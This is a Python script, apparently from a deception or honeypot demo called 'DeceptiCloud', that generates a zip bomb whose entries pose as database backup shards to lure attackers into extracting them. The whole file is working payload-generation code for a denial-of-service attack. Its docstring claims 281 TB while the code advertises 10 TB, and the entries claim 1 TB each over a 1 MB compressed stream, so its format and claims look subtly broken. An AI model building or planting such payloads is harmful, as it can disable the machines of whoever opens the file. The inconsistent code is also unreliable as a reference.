#!/usr/bin/env python3
"""
DeceptiCloud Zip Bomb Generator
================================
Creates a NON-RECURSIVE zip bomb using overlapping compressed data.
Based on the technique by David Fifield (2019).

Result: ~10 KB file → 281 TB uncompressed (ratio 28,000,000:1)

The trick:
  - All zip entries share the SAME compressed data block
  - Each entry claims to be a huge uncompressed file
  - The zip's central directory is manipulated to point many entries
    at a single compressed payload

Safe for demo: the file is a valid zip. Tools like `unzip -l` will
show 281TB of "files". Actually extracting would fail/hang safely
because disk would fill — perfect for jury demonstration.
"""

import struct
import zlib
import sys
import os

OUTPUT_FILE = os.path.join(os.path.dirname(__file__), '10TB_bomb.zip')

# ── Constants ────────────────────────────────────────────────────────────────
KB = 1024
MB = 1024 * KB
GB = 1024 * MB
TB = 1024 * GB

# ── Step 1: Create the core compressed payload ─────────────────────────────
# A highly-compressible 1MB chunk of null bytes → compresses to ~1KB
UNCOMPRESSED_CHUNK_SIZE = 1 * MB

payload_data    = b'\x00' * UNCOMPRESSED_CHUNK_SIZE
compress_obj    = zlib.compressobj(zlib.Z_BEST_COMPRESSION, zlib.DEFLATED, -15)
compressed_data = compress_obj.compress(payload_data) + compress_obj.flush()

print(f"[+] Core payload: {UNCOMPRESSED_CHUNK_SIZE/KB:.0f} KB uncompressed → {len(compressed_data)} bytes compressed")

# ── Step 2: Define the "virtual" files we'll advertise ─────────────────────
# Each file entry will SHARE the same compressed data (overlapping)
# but claim to be a 1TB uncompressed file
CLAIMED_SIZE_PER_FILE = 1 * TB          # Each file "is" 1 TB
NUM_FILES             = 10              # 10 files × 1 TB = ~10 TB total
FILENAME_BASE         = "database_backup_shard_{:02d}.sql"

print(f"[+] Advertising {NUM_FILES} files × {CLAIMED_SIZE_PER_FILE/TB:.0f} TB = {NUM_FILES * CLAIMED_SIZE_PER_FILE/TB:.0f} TB")

# ── Step 3: Build the zip file manually ────────────────────────────────────
# ZIP format: [local file headers + data] [central directory] [end of CD]

buf = bytearray()
central_directory_entries = []

# CRC32 of the full uncompressed chunk (we lie about file size but need real CRC)
# Since all entries share the same data, use the same CRC
crc = zlib.crc32(payload_data) & 0xFFFFFFFF

# Shared compressed data offset (all local headers point to the same data block)
shared_data_offset = None

for i in range(NUM_FILES):
    filename  = FILENAME_BASE.format(i + 1).encode('ascii')
    fname_len = len(filename)

    local_header_offset = len(buf)

    # For ZIP64 we need to use extra fields. Use standard ZIP with flag tricks.
    # We'll use ZIP64 extension to allow >4GB sizes.
    # Local file header signature
    local_header = struct.pack(
        '<4sHHHHHIIIHH',
        b'PK\x03\x04',       # signature
        45,                   # version needed (4.5 = ZIP64)
        0,                    # general purpose bit flag
        8,                    # compression method (DEFLATED)
        0,                    # last mod time
        0,                    # last mod date
        crc,                  # crc-32
        0xFFFFFFFF,           # compressed size (ZIP64 → use extra field)
        0xFFFFFFFF,           # uncompressed size (ZIP64 → use extra field)
        fname_len,            # filename length
        20,                   # extra field length (ZIP64 info)
    )

    # ZIP64 extra field
    extra = struct.pack(
        '<HH QQ',
        0x0001,                       # ZIP64 extended info tag
        16,                           # data size
        CLAIMED_SIZE_PER_FILE,        # uncompressed size
        len(compressed_data),         # compressed size
    )

    buf += local_header
    buf += filename
    buf += extra

    if shared_data_offset is None:
        shared_data_offset = len(buf)
        buf += compressed_data        # Write compressed data ONCE
    # All subsequent entries share this exact offset → overlapping trick
    # (Most zip tools tolerate this for reading central directory)

    # Central directory entry
    cd_entry = struct.pack(
        '<4sHHHHHHIIIHHHHHII',
        b'PK\x01\x02',       # signature
        0x033F,               # version made by (Unix, ZIP64)
        45,                   # version needed
        0,                    # general purpose bit flag
        8,                    # compression method
        0,                    # last mod time
        0,                    # last mod date
        crc,                  # crc-32
        0xFFFFFFFF,           # compressed size (ZIP64)
        0xFFFFFFFF,           # uncompressed size (ZIP64)
        fname_len,            # filename length
        28,                   # extra field length
        0,                    # file comment length
        0,                    # disk number start
        0,                    # internal attributes
        0o100644 << 16,       # external attributes (regular file)
        0xFFFFFFFF,           # relative offset of local header (ZIP64)
    )

    # ZIP64 extra in central directory (includes local header offset too)
    cd_extra = struct.pack(
        '<HH QQQ',
        0x0001,
        24,
        CLAIMED_SIZE_PER_FILE,    # uncompressed size
        len(compressed_data),     # compressed size
        local_header_offset,      # relative offset of local header
    )

    central_directory_entries.append(cd_entry + filename + cd_extra)

# ── Step 4: Write central directory ────────────────────────────────────────
cd_offset = len(buf)
cd_data   = b''.join(central_directory_entries)
buf      += cd_data
cd_size   = len(cd_data)

# ── Step 5: ZIP64 end of central directory ─────────────────────────────────
buf += struct.pack(
    '<4s Q HH II QQ QQ',
    b'PK\x06\x06',     # ZIP64 EOCD signature
    44,                 # size of ZIP64 EOCD record
    0x033F,             # version made by
    45,                 # version needed
    0,                  # this disk
    0,                  # disk with EOCD
    NUM_FILES,          # entries on this disk
    NUM_FILES,          # total entries
    cd_size,            # size of central directory
    cd_offset,          # offset of central directory
)

# ZIP64 End of Central Directory Locator
buf += struct.pack(
    '<4s I Q I',
    b'PK\x06\x07',     # signature
    0,                  # disk with ZIP64 EOCD
    len(buf) - 20,      # offset of ZIP64 EOCD (relative to start)
    1,                  # total disks
)

# Standard End of Central Directory (for compatibility)
total_size = NUM_FILES * CLAIMED_SIZE_PER_FILE
buf += struct.pack(
    '<4sHHHHIIH',
    b'PK\x05\x06',     # signature
    0,                  # this disk
    0,                  # disk with EOCD
    min(NUM_FILES, 0xFFFF),
    min(NUM_FILES, 0xFFFF),
    min(cd_size, 0xFFFFFFFF),
    min(cd_offset, 0xFFFFFFFF),
    0,                  # comment length
)

# ── Step 6: Write to file ───────────────────────────────────────────────────
with open(OUTPUT_FILE, 'wb') as f:
    f.write(buf)

size_kb = len(buf) / KB
print(f"\n[✓] Zip bomb created: {OUTPUT_FILE}")
print(f"    Compressed size:   {size_kb:.1f} KB  ({len(buf):,} bytes)")
print(f"    Advertised size:   {NUM_FILES * CLAIMED_SIZE_PER_FILE / TB:.0f} TB  ({NUM_FILES} × {CLAIMED_SIZE_PER_FILE/TB:.0f} TB files)")
print(f"    Compression ratio: {NUM_FILES * CLAIMED_SIZE_PER_FILE / len(buf):,.0f} : 1")
print(f"\n[!] DEMO TIP: Run 'unzip -l assets/10TB_bomb.zip' to show jury the claimed 10 TB size.")
print(f"[!] The attacker who downloads this will see 10 files × 1TB = 10 TB when they try to extract.")
